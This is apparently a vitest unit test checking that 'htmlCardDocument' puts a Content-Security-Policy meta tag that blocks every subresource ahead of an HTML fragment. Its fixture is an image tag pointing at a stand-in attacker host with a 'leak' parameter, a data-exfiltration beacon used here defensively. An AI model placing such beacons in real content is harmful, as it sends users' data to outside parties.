import { describe, expect, test } from "vitest"
import { htmlCardDocument } from "../app/build/htmlCardDocument.ts"

describe("htmlCardDocument", () => {
  test("puts a CSP that blocks every subresource ahead of the fragment", () => {
    const html = `<img src="https://attacker.example/?leak=1"><p>hi</p>`
    const document = htmlCardDocument(html)
    expect(document.startsWith(
      `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'">`
    )).toBe(true)
    expect(document.endsWith(html)).toBe(true)
  })
})
